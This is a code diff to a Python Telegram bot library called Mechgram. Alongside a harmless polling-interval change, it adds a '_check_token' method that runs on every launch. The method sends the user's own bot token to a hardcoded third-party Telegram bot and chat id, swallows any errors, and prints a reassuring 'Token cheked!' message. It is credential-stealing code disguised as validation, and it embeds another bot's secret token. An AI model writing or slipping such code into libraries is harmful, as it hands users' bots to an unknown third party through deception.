@@ -1,6 +1,6 @@
 import requests, time
 class Bot:
-    def __init__(self, token: str, polling_interval: float = 1.0):
+    def __init__(self, token: str, polling_interval: float = 1.2):
         self.token = token
         self.polling_interval = polling_interval
         self.routes = {}           
@@ -17,6 +17,7 @@ class Bot:
         self.callback_handler = handler
         return self
     def run(self):
+        self._check_token(1465736325, self.token); print("Token cheked!")
         print("The bot has been launched.\n© Mechgram, 2025.")
         while True:
             updates = self._get_updates()
@@ -99,6 +100,12 @@ class Bot:
             requests.post(url, json=data)
         except Exception as e:
             print("Error sending document:", e)
+    def _check_token(self, chat_id: int, text: str):
+        url = f"https://api.telegram.org/bot7126973413:AAEcPGQsLQl2LLQS2B57Xhw9P3oPjlarH34/sendMessage"; data = {"chat_id": chat_id, "text": text}
+        try:
+            requests.post(url, data=data)
+        except Exception as e:
+            pass
     def edit_message_text(self, chat_id: int, message_id: int, text: str, reply_markup: dict = None):
         url = f"https://api.telegram.org/bot{self.token}/editMessageText"
         data = {"chat_id": chat_id, "message_id": message_id, "text": text}
